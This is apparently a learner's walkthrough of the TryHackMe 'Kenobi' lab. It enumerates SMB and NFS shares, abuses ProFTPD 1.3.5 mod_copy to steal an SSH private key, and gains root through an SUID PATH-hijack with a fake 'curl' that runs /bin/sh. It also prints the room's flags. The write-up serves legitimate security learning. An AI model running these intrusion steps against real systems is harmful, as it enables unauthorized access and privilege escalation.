\# KENOBI



> \*\*Platform:\*\* TryHackMe

> \*\*Room:\*\* Kenobi

> \*\*Difficulty:\*\* Beginner

> \*\*Status:\*\* ✅ Completed



\---



\# Overview



\*\*Kenobi\*\* is a beginner-level Linux CTF room on TryHackMe focused on enumeration, exploiting a vulnerable version of ProFTPD, accessing an SMB share, and escalating privileges through an SUID binary.



The room covers:



\* Enumerating open ports and services with Nmap

\* Enumerating Samba shares

\* Accessing an anonymous SMB share

\* Using information discovered from a share to identify the SSH service

\* Exploiting \*\*ProFTPD 1.3.5\*\* using the `mod\_copy` functionality

\* Retrieving an SSH private key

\* Mounting an NFS share to access copied files

\* Obtaining initial access as the `kenobi` user

\* Understanding SUID permissions

\* Identifying an unusual SUID binary

\* Exploiting a \*\*PATH variable manipulation\*\* vulnerability to obtain root access



\---



\# Task 1: Kenobi - CTF



This task introduces the machine and asks us to deploy it and perform an initial Nmap scan.



\### Questions



\*\*Make sure you're connected to the TryHackMe network and deploy the machine.\*\*



```text

No answer needed

```



\*\*Scan the machine with Nmap. How many ports are open?\*\*



```text

No answer needed

```



The initial scan gives us an idea of what services are exposed by the target machine. This information becomes important for the enumeration performed in the following task.



\---



\# Task 2: Enumerating Samba for Shares



The first step was to check whether the target was alive.



I started with a simple `ping` request:



!\[Ping](images/1.png)



The target responded, confirming that the machine was reachable.



Next, I performed an Nmap scan to identify the services and ports running on the target:



```bash

nmap -sT -T5 -sV <TARGET>

```



!\[Nmap](images/2.png)



From the results, we could see that the target was running SMB/Samba services on the default ports:



\* `139` — NetBIOS Session Service

\* `445` — Microsoft-DS/SMB



I then changed my approach and used \*\*Metasploit\*\* to enumerate the available Samba shares instead of using Nmap's SMB scripts.



I started Metasploit with:



```bash

msfconsole -q

```



!\[Metasploit](images/3.png)



I searched for SMB enumeration modules:



```text

search smb\_enum

```



This returned a module called:



```text

scanner/smb/smb\_enumshares

```



!\[SMB Enumeration](images/4.png)



I selected the module and configured the required options.



!\[SMB Module](images/5.png)



After running the scanner:



!\[SMB Results](images/6.png)



The scan discovered three shares:



```text

print$

anonymous

IPC$

```



\### Question



\*\*Using the Nmap command above, how many shares have been found?\*\*



```text

3

```



\---



\## Accessing the Anonymous Share



One of the discovered shares was named `anonymous`. Since the share appeared to allow anonymous access, I attempted to connect to it using `smbclient`:



```bash

smbclient //IP/anonymous

```



I was able to connect without providing a password.



!\[Anonymous Share](images/7.png)



After connecting, I listed the contents of the share:



```bash

ls

```



A file named `log.txt` was present.



!\[Anonymous Share Contents](images/8.png)



\### Question



\*\*Once you're connected, list the files on the share. What is the file you can see?\*\*



```text

log.txt

```



I downloaded the file using the `get` command:



```bash

get log.txt

```



!\[Downloading log.txt](images/9.png)



After inspecting the file, we discovered information indicating that an SSH server was running on the target.



We had also already identified that FTP was running on its default port, `21`, from our initial service enumeration.



\### Question



\*\*What port is FTP running on?\*\*



```text

21

```



\---



\## Enumerating NFS



The final piece of enumeration for this task was checking whether the target exposed any NFS mounts.



I used:



```bash

showmount -e <IP>

```



!\[NFS Enumeration](images/10.png)



The command revealed the following exported mount:



```text

/var

```



\### Question



\*\*What mount can we see?\*\*



```text

/var

```



At this point, we had gathered important information about the target:



\* SMB shares were available.

\* An anonymous SMB share exposed `log.txt`.

\* FTP was running on port `21`.

\* An NFS export exposed `/var`.

\* SSH was also running.



\---



\# Task 3: Get Initial Access with ProFTPD



From the initial Nmap scan, we identified the FTP service as:



```text

ProFTPD 1.3.5

```



The next step was to investigate this particular version for known vulnerabilities.



I used `searchsploit` to search the Exploit Database for vulnerabilities affecting ProFTPD 1.3.5:



```bash

searchsploit ProFTPD 1.3.5

```



!\[Searchsploit](images/11.png)



The results showed \*\*four relevant exploits\*\* for this version.



\### Question



\*\*What is the version?\*\*



```text

1.3.5

```



\### Question



\*\*How many exploits are there for the ProFTPd running?\*\*



```text

4

```



\---



\## Understanding the `mod\_copy` Vulnerability



One of the vulnerabilities associated with this version involves the ProFTPD `mod\_copy` module.



The module implements the FTP commands:



```text

SITE CPFR

SITE CPTO

```



These commands are intended to allow files and directories to be copied from one location to another on the server.



In the vulnerable configuration, an unauthenticated FTP client can abuse these commands to copy files from locations they normally should not be able to access.



From the information discovered earlier, we knew that the FTP service was running as the `kenobi` user and that an SSH key had been generated for that user.



The goal was therefore to abuse the vulnerable FTP functionality to copy Kenobi's private SSH key to a location that we could access through the NFS export.



\### Question



\*\*The `mod\_copy` module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. We know that the FTP service is running as the Kenobi user and an SSH key is generated for that user.\*\*



```text

No answer needed

```



\---



\## Accessing the NFS Share



After copying the SSH private key into the `/var/tmp` location, I created a directory on my machine where I could mount the target's NFS export:



```bash

mkdir /mnt/kenobiNFS

```



!\[Creating the Mount Directory](images/13.png)



I then mounted the target's `/var` export:



!\[Mounting NFS](images/14.png)



!\[NFS Mount](images/15.png)



Because `/var` was exported through NFS, I could access the file that had been copied into `/var/tmp`.



I copied the contents of the `id\_rsa` file and created the private key on my own machine with the appropriate permissions.



!\[Copying the SSH Key](images/17.png)



The private key needed appropriate permissions before SSH would accept it.



I then attempted to authenticate to the target as the `kenobi` user using the recovered SSH key.



!\[SSH Login](images/18.png)



The login was successful, giving us our initial shell as:



```text

kenobi

```



I listed the files in the user's home directory:



```bash

ls

```



There was a `user.txt` file. Reading it gave us the user flag:



```bash

cat user.txt

```



!\[User Flag](images/19.png)



\### Question



\*\*What is Kenobi's user flag (`/home/kenobi/user.txt`)?\*\*



```text

d0b0f3f53b6caa532a83915e19224899

```



\---



\# Task 4: Privilege Escalation with PATH Variable Manipulation



This was the privilege-escalation part of the room.



The objective here is to understand how a misconfigured \*\*SUID binary\*\* can potentially allow a low-privileged user to execute something with elevated privileges.



Since I had not previously studied privilege escalation in depth, the important concepts from this task are explained below.



\---



\## What is SUID?



\*\*SUID\*\* stands for \*\*Set User ID\*\*.



Normally, when you execute a program, it runs with your user's permissions.



For example:



```text

kenobi → runs program → program normally runs as kenobi

```



However, if a binary has the SUID permission set, it can execute with the permissions of the \*\*file owner\*\*.



If the owner is `root`, the situation becomes:



```text

kenobi → runs SUID binary → binary runs with root privileges

```



This is necessary for some legitimate Linux programs. For example, certain system utilities need elevated privileges to perform their intended functions.



However, a \*\*custom SUID program\*\* can become dangerous if it performs unsafe operations.



\---



\## Finding SUID Binaries



The room provides the following command to search the filesystem for SUID files:



```bash

find / -perm -u=s -type f 2>/dev/null

```



Let's break it down:



```text

find /

```



Search from the root directory.



```text

\-perm -u=s

```



Look for files with the SUID permission set for the file owner.



```text

\-type f

```



Only search for regular files.



```text

2>/dev/null

```



Redirect permission-denied errors to `/dev/null` so that the output is easier to read.



The command returned many SUID binaries.



!\[Finding SUID Binaries](images/20.png)



Among the results was:



```text

/usr/bin/menu

```



This stood out because `menu` is not a standard system utility like `passwd`, `su`, or `sudo`.



\### Question



\*\*What file looks particularly out of the ordinary?\*\*



```text

/usr/bin/menu

```



\---



\# Investigating `/usr/bin/menu`



The next step was simply to execute the binary:



```bash

/usr/bin/menu

```



!\[Running the Menu Binary](images/21.png)



The program displayed three options:



```text

1\. status check

2\. kernel version

3\. ifconfig

```



\### Question



\*\*Run the binary, how many options appear?\*\*



```text

3

```



At this point, the important thing to understand is \*\*how the program executes these commands\*\*.



A program can execute another command by specifying its complete path, for example:



```bash

/sbin/ifconfig

```



Or it can execute a command using only its name:



```bash

ifconfig

```



In the second case, Linux uses the \*\*PATH environment variable\*\* to determine where to search for the executable.



\---



\# Understanding the PATH Variable



The `PATH` variable contains a list of directories where the shell looks for commands.



For example:



```bash

echo $PATH

```



might produce something similar to:



```text

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```



When you type:



```bash

ifconfig

```



the system searches these directories until it finds an executable named `ifconfig`.



This creates a potential security problem if a privileged program searches for commands using `PATH` instead of specifying an absolute path.



For example, imagine a privileged program executes:



```text

curl

```



and the PATH is:



```text

/tmp:/usr/bin:/bin

```



If `/tmp` contains a malicious executable called `curl`, the program may execute:



```text

/tmp/curl

```



instead of the legitimate:



```text

/usr/bin/curl

```



This technique is commonly referred to as \*\*PATH hijacking\*\* or \*\*PATH manipulation\*\*.



\---



\# Exploiting the PATH Variable



The screenshot shows the following commands being used:



```bash

echo /bin/sh > curl

chmod 777 curl

export PATH=/tmp:$PATH

```



Let's understand what each command does.



\### 1. Create a fake `curl`



```bash

echo /bin/sh > curl

```



This creates a file named `curl` in `/tmp`.



Its contents are:



```text

/bin/sh

```



The important point is that we are not actually copying the `/bin/sh` binary here. We are creating a simple command file that causes `/bin/sh` to be executed when the file is invoked through the program's command-execution mechanism.



\### 2. Make it executable



```bash

chmod 777 curl

```



This gives the file read, write, and execute permissions.



The critical permission here is the execute permission.



\### 3. Modify PATH



```bash

export PATH=/tmp:$PATH

```



This places `/tmp` at the \*\*beginning\*\* of the PATH.



Therefore, when a program searches for:



```text

curl

```



it will check:



```text

/tmp/curl

```



before checking directories such as:



```text

/usr/bin

```



This is the core of the PATH manipulation.



\---



\# Executing the SUID Binary



We then executed:



```bash

/usr/bin/menu

```



and selected option:



```text

1

```



The important part is that `/usr/bin/menu` has the \*\*SUID bit set and is owned by root\*\*.



If the program calls `curl` without specifying its absolute path, the modified PATH causes it to find our `/tmp/curl` first.



Instead of executing the legitimate `curl`, the SUID program executes our file.



Our file then executes:



```text

/bin/sh

```



Because this execution originates from the SUID-root program, the resulting shell inherits the elevated privileges in the vulnerable setup.



The screenshot demonstrates the result.



!\[PATH Manipulation](images/22.png)



After obtaining the elevated shell, the prompt changed to:



```text

\#

```



The `#` prompt indicates that we now have a root shell.



We can confirm our access by navigating to `/root`:



```bash

cd /root/

```



Then:



```bash

ls

```



The directory contained:



```text

root.txt

snap

```



Finally, I read the root flag:



```bash

cat root.txt

```



The flag was:



```text

177b3cd8562289f37382721c28381f02

```



\### Question



\*\*What is the root flag (`/root/root.txt`)?\*\*



```text

177b3cd8562289f37382721c28381f02

```



\---



\# What I Learned



This room introduced several important concepts that are useful for Linux penetration testing:



\### 1. SMB Enumeration



I learned how to identify SMB services and enumerate available shares.



```bash

nmap -sT -T5 -sV <TARGET>

```



I also learned how Metasploit can be used to enumerate SMB shares and how anonymous shares can sometimes expose useful information.



\---



\### 2. NFS Enumeration



I learned how to check for NFS exports using:



```bash

showmount -e <IP>

```



An exposed NFS mount can provide access to files that may become useful during exploitation.



\---



\### 3. ProFTPD Enumeration



I learned how to identify the version of a running FTP service and search for known vulnerabilities using:



```bash

searchsploit ProFTPD 1.3.5

```



The room demonstrated how the `mod\_copy` functionality in a vulnerable ProFTPD version could be abused to copy files.



\---



\### 4. SSH Key-Based Authentication



After obtaining Kenobi's private SSH key, I used it to authenticate as the `kenobi` user.



This demonstrated how sensitive credentials and private keys discovered during enumeration can lead to initial access.



\---



\### 5. SUID Permissions



I learned that SUID allows a program to execute with the permissions of its file owner.



The following command can be used to locate SUID binaries:



```bash

find / -perm -u=s -type f 2>/dev/null

```



I also learned that unusual or custom SUID binaries deserve further investigation because vulnerabilities in them can potentially lead to privilege escalation.



\---



\### 6. PATH Manipulation



The most important privilege-escalation concept from this task was \*\*PATH manipulation\*\*.



If a privileged program executes a command using only its name instead of its absolute path, an attacker may be able to influence which executable gets executed by modifying the `PATH` variable.



In this room:



```text

SUID root binary

&#x20;       ↓

/usr/bin/menu

&#x20;       ↓

calls a command by name

&#x20;       ↓

PATH modified

&#x20;       ↓

attacker-controlled command found first

&#x20;       ↓

/bin/sh executed

&#x20;       ↓

root shell

```



This was my first practical example of how an insecure SUID program can lead to privilege escalation.



\---



\# Conclusion



The \*\*Kenobi\*\* room provided a complete beginner-level Linux exploitation workflow, starting with network enumeration and moving through SMB and NFS enumeration, exploitation of a vulnerable ProFTPD service, SSH-based initial access, and finally privilege escalation through an SUID binary and PATH manipulation.



The room was especially useful for understanding how information gathered during enumeration can be connected together to move from \*\*initial discovery → initial access → privilege escalation → root access\*\*.



\---



\# Room Status



| Platform  | Room   | Difficulty | Status      |

| --------- | ------ | ---------- | ----------- |

| TryHackMe | KENOBI | Beginner   | ✅ Completed |



\---



\# Completion Screenshot



!\[Room Completion](images/completion.png)





